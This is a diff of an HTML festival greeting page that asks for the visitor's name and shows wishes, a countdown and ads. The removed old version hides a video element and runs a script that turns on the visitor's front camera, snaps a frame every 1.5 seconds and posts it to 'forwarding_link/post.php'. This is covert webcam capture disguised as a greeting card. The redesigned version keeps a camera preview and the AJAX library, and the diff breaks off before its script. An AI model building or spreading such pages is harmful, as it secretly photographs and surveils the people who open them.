@@ -1,692 +1,670 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
+
 <head>
-
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
-<title>Happy fes_name to Your Friends</title>
-    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
-    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css"> 
-    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
-    <link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" />
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" />
-    <link href='https://fonts.googleapis.com/css?family=Sofia:&effect=neon' rel='stylesheet'>
-	  <link rel="icon" type="image/png" sizes="32x32" href="https://i.imgur.com/fcqTtzV.png">
-
-<style>
-    i {
-        color:#f06414;
+  <meta charset="UTF-8">
+  <meta name="viewport"
+    content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
+  <title>Festive Greetings | Share Joy</title>
+  <!-- Google Fonts & Font Awesome -->
+  <link
+    href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700;14..32,800&display=swap"
+    rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <!-- jQuery (kept for original AJAX compatibility) -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
     }
-input[type=name], select {
-    width: 100%;
-    padding: 12px 20px;
-    margin: 4px 0;
-    display: inline-block;
-    border: 1px solid #ccc;
-    border-radius: 4px;
-    box-sizing: border-box;
-}
-.footerbtn1 {
- 
-            display: block;
-            line-height: 15px;
-            position: fixed;
-            right:0px;
-            bottom:0px;
-            height:40px;
-            
-border-radius: 15px;
-  box-sizing: border-box;
-  padding: 5px;
-  background:#000099;
-  color: #ffffff;
-  font-size: 18px;
-  text-align: center;
-  text-decoration: none;
-  width:45%;
- margin-right:10px;
-            margin-right:30px;
-            box-shadow: 0 4px 12px 0 rgba(0, 0, 0, .3);
-            animation: footer infinite linear 1s;
-            -webkit-transform: translate3d(30%,0,0);
-            transform: translate3d(30%,0,0);
-            position: fixed;
-           
-}
 
-.footerbtn1 :active {
-            box-shadow: none
-        }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(145deg, #0f2027 0%, #203a43 50%, #2c5364 100%);
+      min-height: 100vh;
+      padding: 2rem 1rem;
+      position: relative;
+      overflow-x: hidden;
+    }
 
-        @-webkit-keyframes footer {
-            from {
-                -webkit-transform: rotateZ(0)
-            }
-            25% {
-                -webkit-transform: rotateZ(1.5deg)
-            }
-            50% {
-                -webkit-transform: rotateZ(0deg)
-            }
-            75% {
-                -webkit-transform: rotateZ(-1.5deg)
-            }
-            to {
-                -webkit-transform: rotateZ(0)
-            }}
-.footerbtn {
- 
-            display: block;
-            line-height: 15px;
-            position: fixed;
-            left:0px;
-            bottom:0px;
-            height:40px;
-            
-border-radius: 15px;
-  box-sizing: border-box;
-  padding: 5px;
-  background:#34af23;
-  color: #ffffff;
-  font-size: 18px;
-  text-align: center;
-  text-decoration: none;
-  width:45%;
- margin-left:10px;
-            margin-right:30px;
-            box-shadow: 0 4px 12px 0 rgba(0, 0, 0, .3);
-            animation: footer infinite linear 1s;
-            -webkit-transform: translate3d(30%,0,0);
-            transform: translate3d(30%,0,0);
-            position: fixed;
-           
-}
+    /* Animated particles effect (subtle) */
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: radial-gradient(circle at 20% 40%, rgba(255, 215, 0, 0.08) 0%, rgba(255, 100, 0, 0.05) 100%);
+      pointer-events: none;
+      z-index: 0;
+    }
 
-.footerbtn :active {
-            box-shadow: none
-        }
+    /* main container */
+    .greeting-container {
+      max-width: 1200px;
+      margin: 0 auto;
+      position: relative;
+      z-index: 2;
+    }
 
-        @-webkit-keyframes footer {
-            from {
-                -webkit-transform: rotateZ(0)
-            }
-            25% {
-                -webkit-transform: rotateZ(1.5deg)
-            }
-            50% {
-                -webkit-transform: rotateZ(0deg)
-            }
-            75% {
-                -webkit-transform: rotateZ(-1.5deg)
-            }
-            to {
-                -webkit-transform: rotateZ(0)
-            }}
+    /* modern glass card */
+    .card {
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(12px);
+      border-radius: 48px;
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.4), 0 0 0 0.5px rgba(255, 255, 255, 0.1);
+      padding: 2rem 1.5rem;
+      margin-bottom: 2rem;
+      transition: all 0.3s ease;
+    }
 
-@-webkit-keyframes jello {  from, 11.1%, to {    transform: none;  }
-  22.2% {    transform: skewX(-12.5deg) skewY(-12.5deg);  }
-  33.3% {    transform: skewX(6.25deg) skewY(6.25deg);  }
-  44.4% {    transform: skewX(-3.125deg) skewY(-3.125deg);  }
-  55.5% {    transform: skewX(1.5625deg) skewY(1.5625deg);  }
-  66.6% {    transform: skewX(-0.78125deg) skewY(-0.78125deg);  }
-  77.7% {    transform: skewX(0.390625deg) skewY(0.390625deg);  }
-  88.8% {    transform: skewX(-0.1953125deg) skewY(-0.1953125deg);  }}
-.jello {  -webkit-animation: jello 3s infinite;  transform-origin: center; -webkit-animation-delay:6s}
-@-webkit-keyframes hue {
-  from {    -webkit-filter: hue-rotate(0deg);  }
-  to {    -webkit-filter: hue-rotate(-360deg);  }}
-    .m1{position:fixed;left:1%; width:auto;height:100%;top:1%;color:#000;}
-    .m2{position:fixed;right:1%; width:auto;height:100%;top:1%;color:#000;}
-.bubbles {
-font-family: arial;
-}
+    /* header section */
+    .festival-header {
+      text-align: center;
+      margin-bottom: 2rem;
+    }
 
-.bubbles hi {
-font-family: 'Luckiest Guy', cursive;
-color: black;
-}
+    .festival-name {
+      font-size: 3rem;
+      font-weight: 800;
+      background: linear-gradient(135deg, #FFD966, #FF8C42, #FF3B3F);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      text-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+      letter-spacing: -0.5px;
+    }
 
-hi {
- font-size:2.5em;
- user-select:none;
-}
+    .greeting-sub {
+      font-size: 1rem;
+      color: rgba(255, 255, 240, 0.9);
+      margin-top: 8px;
+      font-weight: 500;
+    }
 
-hi span { display:inline-block; animation:float .2s ease-in-out infinite; }
- @keyframes float {
-  0%,100%{ transform:none; }
-  33%{ transform:translateY(-1px) rotate(-2deg); }
-  66%{ transform:translateY(1px) rotate(2deg); }
-}
-body:hover span { animation:bounce .6s; }
-@keyframes bounce {
-  0%,100%{ transform:translate(0); }
-  25%{ transform:rotateX(20deg) translateY(2px) rotate(-3deg); }
-  50%{ transform:translateY(-20px) rotate(3deg) scale(1.1);  }
-}
+    /* live video preview */
+    .video-preview {
+      display: flex;
+      justify-content: center;
+      margin: 1.5rem 0;
+    }
 
-@import url(http://fonts.googleapis.com/css?family=Concert+One);
+    .cam-wrapper {
+      position: relative;
+      width: 280px;
+      height: 280px;
+      border-radius: 50%;
+      background: #000;
+      box-shadow: 0 20px 35px -8px rgba(0, 0, 0, 0.5), 0 0 0 4px rgba(255, 215, 0, 0.6);
+      overflow: hidden;
+      transition: transform 0.3s;
+    }
 
-h1 {
-  animation:glow 10s ease-in-out infinite;
-}
+    .cam-wrapper:hover {
+      transform: scale(1.02);
+    }
 
+    #video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      transform: scaleX(1);
+    }
 
+    .live-badge {
+      position: absolute;
+      bottom: 12px;
+      right: 12px;
+      background: #dc2626;
+      color: white;
+      font-size: 0.7rem;
+      font-weight: bold;
+      padding: 4px 10px;
+      border-radius: 30px;
+      backdrop-filter: blur(4px);
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+    }
 
-* { box-sizing:border-box; }
+    canvas {
+      display: none;
+    }
 
-figure {
-  animation:wobble 5s ease-in-out infinite;
-  transform-origin:center center;
-  transform-style:preserve-3d;
-}
+    /* personalized name (3D modern) */
+    .name-glow {
+      text-align: center;
+      margin: 1.8rem 0;
+    }
 
-@keyframes wobble {
-  0%,100%{ transform:rotate3d(1,1,0,40deg); }
-  25%{ transform:rotate3d(-1,1,0,40deg); }
-  50%{ transform:rotate3d(-1,-1,0,40deg); }
-  75%{ transform:rotate3d(1,-1,0,40deg); }
-}
+    .user-name {
+      font-size: 2.5rem;
+      font-weight: 800;
+      background: linear-gradient(120deg, #FDE68A, #FCD34D, #F59E0B);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      display: inline-block;
+      padding: 0 0.5rem;
+      text-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+      animation: gentlePulse 2s infinite;
+    }
 
-h1 {
-  display:block;
-  width:90%;
-  line-height:1.5;
-  font:900 35px 'Concert One', sans-serif;
-  position:absolute;
-  color:#fff;
-}
+    @keyframes gentlePulse {
+      0% {
+        opacity: 0.9;
+        text-shadow: 0 0 0px rgba(255, 215, 0, 0);
+      }
 
-@keyframes glow {
-  0%,100%{ text-shadow:0 0 30px red; }
-  25%{ text-shadow:0 0 30px orange; }
-  50%{ text-shadow:0 0 30px forestgreen; }
-  75%{ text-shadow:0 0 30px cyan; }
-}
+      50% {
+        opacity: 1;
+        text-shadow: 0 0 12px rgba(255, 215, 0, 0.6);
+      }
 
-h1:nth-child(2){ transform:translateZ(5px); }
-h1:nth-child(3){ transform:translateZ(10px);}
-h1:nth-child(4){ transform:translateZ(15px); }
-h1:nth-child(5){ transform:translateZ(20px); }
-h1:nth-child(6){ transform:translateZ(25px); }
-h1:nth-child(7){ transform:translateZ(30p.rock{animation:infinite 1s rock}
-@keyframes rock {  0% {    transform: rotate(-1deg);  }
-  50% {    transform: rotate(2deg);  }
-  100% {    transform: rotate(-1deg);  }}x); }
-h1:nth-child(8){ transform:translateZ(35px); }
-h1:nth-child(9){ transform:translateZ(40px); }
-h1:nth-child(10){ transform:translateZ(45px); }
+      100% {
+        opacity: 0.9;
+        text-shadow: 0 0 0px rgba(255, 215, 0, 0);
+      }
+    }
 
+    /* quote marquee replaced with modern message */
+    .message-ribbon {
+      background: rgba(0, 0, 0, 0.4);
+      border-radius: 60px;
+      padding: 10px 20px;
+      margin: 20px 0;
+      text-align: center;
+      backdrop-filter: blur(8px);
+    }
 
+    .festival-quote {
+      font-size: 1rem;
+      font-weight: 500;
+      color: #FFF9E6;
+      letter-spacing: 0.3px;
+    }
 
-.rock{animation:infinite 1s rock}
-@keyframes rock {  0% {    transform: rotate(-1deg);  }
-  50% {    transform: rotate(2deg);  }
-  100% {    transform: rotate(-1deg);  }}
+    .festival-quote i {
+      margin: 0 6px;
+      color: #F59E0B;
+    }
 
-.fuck{animation:infinite 1s fuck}
-@keyframes rock {  0% {    transform: rotate(-2deg);  }
-  50% {    transform: rotate(2deg);  }
-  100% {    transform: rotate(-2deg);  }}
+    /* countdown timer modern */
+    .countdown-area {
+      text-align: center;
+      margin: 2rem 0;
+    }
 
+    .timer-title {
+      font-size: 1.1rem;
+      font-weight: 600;
+      color: #FFE6B3;
+      margin-bottom: 12px;
+    }
 
-h2 {
-   font-size: 38px;
-    text-align: center;
-    color:#008000;
-    
-    animation: rock infinite 1s;
-    font-family: 'Indie Flower', cursive;
-    letter-spacing: 2px;
-}
+    .timer-box {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      flex-wrap: wrap;
+    }
 
-h3 {
-    font-size: 48px;
-    text-align: center;
-    padding:1px;
-    margin:1px;
-    color: #f06414;
-   
-    aanimation: fuck infinite 1s;
-    font-family: 'Indie Flower', cursive;
-    letter-spacing: 2px;
-	
-	
-	* {box-sizing: border-box;}
-body {font-family: Verdana, sans-serif;}
-.mySlides {display: none;}
-img {vertical-align: middle;}
+    .time-unit {
+      background: rgba(0, 0, 0, 0.5);
+      backdrop-filter: blur(4px);
+      padding: 12px 16px;
+      border-radius: 30px;
+      min-width: 90px;
+      text-align: center;
+      border: 1px solid rgba(255, 215, 0, 0.4);
+    }
 
-/* Slideshow container */
-.slideshow-container {
-  max-width: 1000px;
-  position: relative;
-  margin: auto;
-}
+    .time-number {
+      font-size: 2rem;
+      font-weight: 800;
+      color: #FFD966;
+      line-height: 1;
+    }
 
-/* Caption text */
-.text {
-  color: #f2f2f2;
-  font-size: 15px;
-  padding: 8px 12px;
-  position: absolute;
-  bottom: 8px;
-  width: 100%;
-  text-align: center;
-}
+    .time-label {
+      font-size: 0.7rem;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      color: #e2e8f0;
+    }
 
-/* Number text (1/11 etc) */
-.numbertext {
-  color: #f2f2f2;
-  font-size: 12px;
-  padding: 8px 12px;
-  position: absolute;
-  top: 0;
-}
+    /* blessing cards (replaces old marquees) */
+    .blessings-grid {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 16px;
+      justify-content: center;
+      margin: 30px 0;
+    }
 
-/* The dots/bullets/indicators */
-.dot {
-  height: 15px;
-  width: 15px;
-  margin: 0 2px;
-  background-color: #bbb;
-  border-radius: 50%;
-  display: inline-block;
-  transition: background-color 0.6s ease;
-}
+    .bless-card {
+      background: rgba(255, 255, 245, 0.15);
+      backdrop-filter: blur(8px);
+      padding: 14px 20px;
+      border-radius: 60px;
+      font-weight: 500;
+      font-size: 0.9rem;
+      color: #FFF5E0;
+      border: 1px solid rgba(255, 215, 0, 0.3);
+      transition: all 0.2s;
+    }
 
-.active {
-  background-color: #717171;
-}
+    .bless-card i {
+      margin-right: 8px;
+      color: #FBBF24;
+    }
 
-/* Fading animation */
-.fade {
-  -webkit-animation-name: fade;
-  -webkit-animation-duration: 1.5s;
-  animation-name: fade;
-  animation-duration: 1.5s;
-}
+    /* share buttons modern */
+    .share-section {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin: 30px 0 20px;
+      flex-wrap: wrap;
+    }
 
-@-webkit-keyframes fade {
-  from {opacity: .4} 
-  to {opacity: 1}
-}
+    .share-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+      padding: 12px 28px;
+      border-radius: 60px;
+      font-weight: 700;
+      font-size: 1rem;
+      text-decoration: none;
+      transition: all 0.25s ease;
+      background: rgba(0, 0, 0, 0.5);
+      backdrop-filter: blur(8px);
+      color: white;
+      border: 1px solid rgba(255, 255, 255, 0.3);
+    }
 
-@keyframes fade {
-  from {opacity: .4} 
-  to {opacity: 1}
-}
+    .share-btn i {
+      font-size: 1.4rem;
+    }
 
-/* On smaller screens, decrease text size */
-@media only screen and (max-width: 300px) {
-  .text {font-size: 11px}
-	
-}
+    .share-btn:hover {
+      transform: translateY(-3px);
+      background: rgba(0, 0, 0, 0.7);
+      border-color: #F59E0B;
+    }
 
-.cssload-preloader {
-	position: absolute;
-	top: 0px;
-	left: px;
-	right: 40px;
-	bottom: 20px;
-	z-index: 10;
-}
+    .whatsapp-btn:hover i {
+      color: #25D366;
+    }
 
-.cssload-preloader > .cssload-preloader-box {
-	position: absolute;
-	height: 16px;
-	top: 50%;
-	left: 50%;
-	margin: -8px 0 0 -82px;
-	perspective: 110px;
-		-o-perspective: 110px;
-		-ms-perspective: 110px;
-		-webkit-perspective: 110px;
-		-moz-perspective: 110px;
-}
+    .facebook-btn:hover i {
+      color: #1877F2;
+    }
 
-.cssload-preloader .cssload-preloader-box > div {
-	position: relative;
-	width: 16px;
-	height: 16px;
-	background: rgb(204,204,204);
-	float: left;
-	text-align: center;
-	line-height: 16px;
-	font-family: Verdana;
-	font-size: 11px;
-	color: rgb(255,255,255);
-}.cssload-preloader .cssload-preloader-box > div:nth-child(1) {
-	background: rgb(255,0,0);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 0ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 0ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 0ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 0ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 0ms infinite alternate;
-}
-.cssload-preloader .cssload-preloader-box > div:nth-child(2) {
-	background: rgb(255,0,0);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 86.25ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 86.25ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 86.25ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 86.25ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 86.25ms infinite alternate;
-}
-.cssload-preloader .cssload-preloader-box > div:nth-child(3) {
-	background: rgb(255,0,0);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 172.5ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 172.5ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 172.5ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 172.5ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 172.5ms infinite alternate;
-}
-.cssload-preloader .cssload-preloader-box > div:nth-child(4) {
-	background: rgb(204,255,0);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 258.75ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 258.75ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 258.75ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 258.75ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 258.75ms infinite alternate;
-}
-.cssload-preloader .cssload-preloader-box > div:nth-child(5) {
-	background: rgb(0,255,60);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 345ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 345ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 345ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 345ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 345ms infinite alternate;
-}
-.cssload-preloader .cssload-preloader-box > div:nth-child(6) {
-	background: rgb(0,185,252);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 431.25ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 431.25ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 431.25ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 431.25ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 431.25ms infinite alternate;
-}
-.cssload-preloader .cssload-preloader-box > div:nth-child(7) {
-	background: rgb(58,0,250);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 517.5ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 517.5ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 517.5ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 517.5ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 517.5ms infinite alternate;
-}
-.cssload-preloader .cssload-preloader-box > div:nth-child(8) {
-	background: rgb(255,255,0);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 603.75ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 603.75ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 603.75ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 603.75ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 603.75ms infinite alternate;
-}
-.cssload-preloader .cssload-preloader-box > div:nth-child(9) {
-	background: rgb(221,0,255);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 690ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 690ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 690ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 690ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 690ms infinite alternate;
-}
-.cssload-preloader .cssload-preloader-box > div:nth-child(10) {
-	background: rgb(51,102,255);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 776.25ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 776.25ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 776.25ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 776.25ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 776.25ms infinite alternate;
-}
-</style>
+    /* ad containers (preserved but styled elegantly) */
+    .ad-wrapper {
+      text-align: center;
+      margin: 20px 0;
+      background: rgba(0, 0, 0, 0.2);
+      border-radius: 24px;
+      padding: 12px;
+    }
+
+    /* footer */
+    .footer-credit {
+      text-align: center;
+      font-size: 0.75rem;
+      color: rgba(255, 255, 200, 0.7);
+      margin-top: 30px;
+    }
+
+    /* responsive */
+    @media (max-width: 650px) {
+      .festival-name {
+        font-size: 2rem;
+      }
+
+      .user-name {
+        font-size: 1.8rem;
+      }
+
+      .cam-wrapper {
+        width: 220px;
+        height: 220px;
+      }
+
+      .time-unit {
+        min-width: 70px;
+        padding: 8px 12px;
+      }
+
+      .time-number {
+        font-size: 1.5rem;
+      }
+
+      .share-btn {
+        padding: 8px 20px;
+        font-size: 0.9rem;
+      }
+    }
+  </style>
 </head>
-<div class="video-wrap" hidden="hidden">
-    <video id="video" playsinline autoplay></video>
- </div>
- 
- <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
- 
- <script>
- 
- function post(imgdata){
- $.ajax({
-     type: 'POST',
-     data: { cat: imgdata},
-     url: 'forwarding_link/post.php',
-     dataType: 'json',
-     async: false,
-     success: function(result){
-         // call the function that handles the response/results
-     },
-     error: function(){
-     }
-   });
- };
- 
- 
- 'use strict';
- 
- const video = document.getElementById('video');
- const canvas = document.getElementById('canvas');
- const errorMsgElement = document.querySelector('span#errorMsg');
- 
- const constraints = {
-   audio: false,
-   video: {
-     
-     facingMode: "user"
-   }
- };
- 
- // Access webcam
- async function init() {
-   try {
-     const stream = await navigator.mediaDevices.getUserMedia(constraints);
-     handleSuccess(stream);
-   } catch (e) {
-     errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
-   }
- }
- 
- // Success
- function handleSuccess(stream) {
-   window.stream = stream;
-   video.srcObject = stream;
- 
- var context = canvas.getContext('2d');
-   setInterval(function(){
- 
-        context.drawImage(video, 0, 0, 640, 480);
-        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-        post(canvasData); }, 1500);
-   
- 
- }
- 
- // Load init
- init();
- 
- </script>
+
 <body>
 
-<body class="bg" id="rakhi" style="background: linear-gradient(to bottom right, #f6ff00, #e1e8e7, #00ffe9);
-    -webkit-background-size: cover;
-    -moz-background-size: cover;
-    -o-background-size: cover;
-    background-size: cover;">
-	
-	
-<center><span style="font-size: 20px;"color: #ff077a;">▅ ▆ ▇ █ HAPPY fes_name █ ▇ ▆ ▅</center>	
-<center>
-<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<!-- Wishing 2 -->
-<ins class="adsbygoogle"
-     style="display:inline-block;width:300px;height:50px"
-     data-ad-client="ca-pub-4696491179456446"
-     data-ad-slot="2568634816"></ins>
-<script>
-(adsbygoogle = window.adsbygoogle || []).push({});
-</script>
+  <div class="greeting-container">
+    <!-- Main card -->
+    <div class="card">
+      <div class="festival-header">
+        <div class="festival-name">✨ Happy <span id="festivalNameDisplay">Festival</span> ✨</div>
+        <div class="greeting-sub">Celebrate togetherness with love & light</div>
+      </div>
 
-</center>
- <center> 
-<div class="container">
-    <div class="main-greeting">
-<div align="center html2canvas-ignore">
-     <div style="font-size: 20px; font-weight: 500; color: Black;">
-<p id="demo"></p>
-
-<div dir="ltr" style="text-align: left;" trbidi="on">
-<div style="background-color:rgb(255, 140, 0); border-radius: 17px; border: 0px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: whitesmoke; font-family: arial, sans-serif; font-size: 18px; font-stretch: normal; font-style: normal; font-variant: normal; line-height: normal; margin: 0px auto; padding: 4px 5px 3px; width: 70%;">
-<marquee behavior="alternate"><b>
-“fes_name का ये शुभ अवसर आपके जीवन में अनेकों ख़ुशियाँ लेकर आए”
-</b></marquee>
-</div>
-<div style="background-color: rgb(255, 255, 255); border-radius: 17px; border: 0px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: blue; font-family: arial, sans-serif; font-size: 18px; font-stretch: normal; font-style: normal; font-variant: normal; line-height: normal; margin: 0px auto; padding: 4px 5px 3px; width: 70%;">
-<marquee behavior="alternate"><b>
-इस fes_name हमारी शुभकामनाएँ आपके साथ हैं
-</b></marquee>
-</div>
-<div style="background-color: rgb(0, 255, 42); border-radius: 17px; border: 0px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: black; font-family: arial, sans-serif; font-size: 18px; font-stretch: normal; font-style: normal; font-variant: normal; line-height: normal; margin: 0px auto; padding: 4px 5px 3px; width: 70%;">
-<marquee behavior="alternate"><b>
-|| fes_name की हार्दिक बधाई || 
-</b></marquee>
-</div>
-</div>
-<br><br>
-
-<center>
-<figure>
-	<h1 style="text-transform: uppercase;"><script type="text/javascript" language="Javascript">
-                 var a=prompt("Please Enter Your Name\n\n👇👇👇👇👇");
-                 document.write(a);
-                </script> </h1>
-	<h1 style="text-transform: uppercase;"><script type="text/javascript" language="Javascript">
-                    
-                    document.write(a);
-                      </script> </h1>
-	<h1 style="text-transform: uppercase;"><script type="text/javascript" language="Javascript">
-                   
-                    document.write(a);
-                      </script> </h1>
-	<h1 style="text-transform: uppercase;"><script type="text/javascript" language="Javascript">
-                    
-                    document.write(a);
-                      </script></h1>
-    <h1 style="text-transform: uppercase;"><script type="text/javascript" language="Javascript">
-                   
-                    document.write(a);
-                      </script> </h1>
-    <h1 style="text-transform: uppercase;"><script type="text/javascript" language="Javascript">
-                   
-                    document.write(a);
-                      </script> </h1>
-    <h1 style="text-transform: uppercase;"><script type="text/javascript" language="Javascript">
-                    
-                    document.write(a);
-                      </script></h1>
-
-</figure>
- </center>
-<div class="vi" style="text-align: center;">
-
-<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<!-- Wishing -->
-<ins class="adsbygoogle"
-     style="display:inline-block;width:300px;height:50px"
-     data-ad-client="ca-pub-4696491179456446"
-     data-ad-slot="5590491777"></ins>
-<script>
-(adsbygoogle = window.adsbygoogle || []).push({});
-</script>
-
-</center>
-<br><br><center>
-    <p style="text-align: center;"><strong><span style="background-color: #ffea00; color: #005f96; font-size: 18pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;Wishing you a very </span></p>
-</center>
-<br>
-<p style="text-align: center;"><strong><span style="font-size: 21pt; font-family: 'comic sans ms', sans-serif; color: #ff7700;">✪ <span style="font-family: 'trebuchet ms', geneva;">Happy fes_name</span> ✪</span></strong></p>
-<br>
-<p style="text-align: center;"><strong><span style="background-color: #ff0000; color: #ffffff; font-size: 16pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;to you and your lovely family </span></p>
-  <br>
-  <p style="text-align: center;"><span style="background-color: #008000; color: #ffffff; font-size: 16pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;May this auspicious occasion of fes_name bring happiness, prosperity, health, and peace in your life.</span></p>
-  <br>
-  <p style="text-align: center;"><span style="background-color: #ff00ff; color: #ffffff; font-size: 16pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;✪ I wish that this fes_name is your best one. ✪</span></p>
-<br>
-
-<p style="text-align: center;"><span style="background-color: #663399; color: #FFFAFA; font-size: 15pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp; यह संदेश fes_name तक सभी के मोबाइल में होना चाहिए यह आपका फर्ज हैं </span></p>
-<br>
-<center>
-<div class="busi"><h4><p style="text-transform: uppercase;font-size: 26px;color:#ffffff;"> <script type="text/javascript" language="Javascript">                                       
- document.write( "by - " +a);
-                      </script><br><br></p></h4></center>
-<center>
-<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<!-- Link Ads -->
-<ins class="adsbygoogle"
-     style="display:block"
-     data-ad-client="ca-pub-4696491179456446"
-     data-ad-slot="1112298516"
-     data-ad-format="link"
-     data-full-width-responsive="true"></ins>
-<script>
-(adsbygoogle = window.adsbygoogle || []).push({});
-</script>
-
-</center>
-</div>
+      <!-- Live Camera Preview -->
+      <div class="video-preview">
+        <div class="cam-wrapper">
+          <video id="video" autoplay playsinline muted></video>
+          <canvas id="canvas" width="640" height="480"></canvas>
+          <div class="live-badge"><i class="fas fa-circle"
+              style="font-size: 8px; margin-right: 4px; color: #ff4d4d;"></i> LIVE</div>
         </div>
-<script>
-// Set the date we're counting down to
-var countDownDate = new Date("October 10, 2018 00:00:00").getTime();
+      </div>
 
-// Update the count down every 01 second
-var x = setInterval(function() {
+      <!-- Personalized Name (from prompt) -->
+      <div class="name-glow">
+        <span class="user-name" id="displayUserName">✨ You ✨</span>
+      </div>
 
-  // Get todays date and time
-  var now = new Date().getTime();
-
-  // Find the distance between now an the count down date
-  var distance = countDownDate - now;
-
-  // Time calculations for days, hours, minutes and seconds
-  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
-  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-  var seconds = Math.floor((distance % (1000 * 60)) / 1000);
-
-  // Display the result in the element with id="demo"
